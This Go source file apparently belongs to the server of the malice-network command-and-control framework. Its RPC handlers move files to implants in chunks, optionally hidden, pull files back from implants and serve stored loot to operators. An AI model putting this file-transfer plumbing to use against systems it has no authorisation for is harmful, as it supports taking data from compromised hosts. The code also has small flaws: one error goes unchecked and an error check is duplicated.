package rpc

import (
	"context"
	"fmt"
	"github.com/chainreactors/files"
	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/packet"
	"github.com/chainreactors/malice-network/helper/types"
	"github.com/chainreactors/malice-network/proto/client/clientpb"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/server/internal/configs"
	"github.com/chainreactors/malice-network/server/internal/core"
	"github.com/chainreactors/malice-network/server/internal/db"
	"github.com/chainreactors/malice-network/server/internal/db/models"
	"github.com/gookit/config/v2"
	"os"
	"path"
)

// Upload - Upload a file from the remote file system
func (rpc *Server) Upload(ctx context.Context, req *implantpb.UploadRequest) (*clientpb.Task, error) {
	count := packet.Count(req.Data, config.Int(consts.MaxPacketLength))
	if count == 1 {
		greq, err := newGenericRequest(ctx, req)
		if err != nil {
			return nil, err
		}
		ch, err := rpc.asyncGenericHandler(ctx, greq)
		if err != nil {
			return nil, err
		}
		err = db.AddTask("upload", greq.Task, &models.FileDescription{
			Name:    req.Name,
			Path:    req.Target,
			Command: fmt.Sprintf("upload -%d -%t", req.Priv, req.Hidden),
			Size:    int64(len(req.Data)),
		})
		if err != nil {
			logs.Log.Errorf("cannot create task %d, %s in db", greq.Task.Id, err.Error())
			return nil, err
		}
		go greq.HandlerAsyncResponse(ch, types.MsgBlock)
		err = db.UpdateTask(greq.Task, greq.Task.Cur)
		if err != nil {
			logs.Log.Errorf("cannot update task %d , %s in db", greq.Task.Id, err.Error())
			return nil, err
		}
		return greq.Task.ToProtobuf(), nil
	} else {
		greq, err := newGenericRequest(ctx, &implantpb.UploadRequest{
			Name:   req.Name,
			Target: req.Target,
			Priv:   req.Priv,
			Hidden: req.Hidden,
		}, count)
		in, out, err := rpc.streamGenericHandler(ctx, greq)
		if err != nil {
			return nil, err
		}

		if err != nil {
			logs.Log.Errorf("cannot create task %d , %s in db", greq.Task.Id, err.Error())
			return nil, err
		}
		var blockId = 0
		go func() {
			stat := <-out
			err := AssertStatus(stat)
			if err != nil {
				greq.Task.Panic(buildErrorEvent(greq.Task, err), stat)
				return
			}
			for block := range packet.Chunked(req.Data, config.Int(consts.MaxPacketLength)) {
				msg := &implantpb.Block{
					BlockId: uint32(blockId),
					Content: block,
				}
				if blockId == count-1 {
					msg.End = true
				}
				spite, _ := types.BuildSpite(&implantpb.Spite{
					Timeout: uint64(consts.MinTimeout.Seconds()),
					TaskId:  greq.Task.Id,
				}, msg)
				in <- spite
				resp := <-out
				err = AssertResponse(resp, types.MsgAck)
				if err != nil {
					return
				}
				greq.Session.AddMessage(resp, blockId)
				if resp.GetAsyncAck().Success {
					greq.Task.Done(core.Event{
						EventType: consts.EventTaskDone,
						Task:      greq.Task,
					})
					err = db.UpdateTask(greq.Task, blockId)
					if err != nil {
						logs.Log.Errorf("cannot update task %d , %s in db", greq.Task.Id, err.Error())
						return
					}
				}
			}
			close(in)
		}()
		return greq.Task.ToProtobuf(), nil
	}
}

// Download - Download a file from implant
func (rpc *Server) Download(ctx context.Context, req *implantpb.DownloadRequest) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	in, out, err := rpc.streamGenericHandler(ctx, greq)
	if err != nil {
		logs.Log.Debugf("stream generate error: %s", err)
		return nil, err
	}

	go func() {
		resp := <-out

		stat := resp.GetStatus()
		err := AssertStatus(resp)
		if err != nil {
			greq.Task.Panic(buildErrorEvent(greq.Task, err), resp)
			return
		}
		fileName := path.Join(configs.TempPath, stat.GetDownloadResponse().Checksum)
		if files.IsExist(fileName) {
			greq.Task.Finish(core.Event{
				EventType: consts.EventTaskCallback,
				Task:      greq.Task,
			})
			return
		}
		greq.Task.Total = int(stat.GetDownloadResponse().Size) / config.Int(consts.MaxPacketLength)
		td := &models.FileDescription{
			Name:    req.Name,
			Path:    req.Path,
			Command: fmt.Sprintf("download -%s -%s ", req.Name, req.Path),
			Size:    int64(stat.GetDownloadResponse().Size),
		}
		err = db.AddTask("download", greq.Task, td)
		if err != nil {
			logs.Log.Errorf("cannot create task %d , %s in db", greq.Task.Id, err.Error())
		}
		downloadFile, err := os.OpenFile(fileName, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			return
		}
		defer downloadFile.Close()
		for resp := range out {
			block := resp.GetBlock()
			_, err = downloadFile.Write(block.Content)
			if err != nil {
				return
			}
			ack, _ := greq.NewSpite(&implantpb.AsyncACK{Success: true})
			in <- ack
			err := db.UpdateTask(greq.Task, int(block.BlockId))
			if err != nil {
				logs.Log.Errorf("cannot update task %d , %s in db", greq.Task.Id, err.Error())
				return
			}
		}
	}()
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) Sync(ctx context.Context, req *clientpb.Sync) (*clientpb.SyncResp, error) {
	td, err := db.GetTaskDescriptionByID(req.FileId)
	if err != nil {
		logs.Log.Errorf("cannot find task in db by fileid: %s", err)
		return nil, err
	}
	//if !files.IsExist(td.Path + td.Name) {
	//	return nil, os.ErrExist
	//}
	data, err := os.ReadFile(path.Join(td.Path, td.Name))
	if err != nil {
		return nil, err
	}
	resp := &clientpb.SyncResp{
		Name:    td.Name,
		Content: data,
	}
	return resp, nil
}
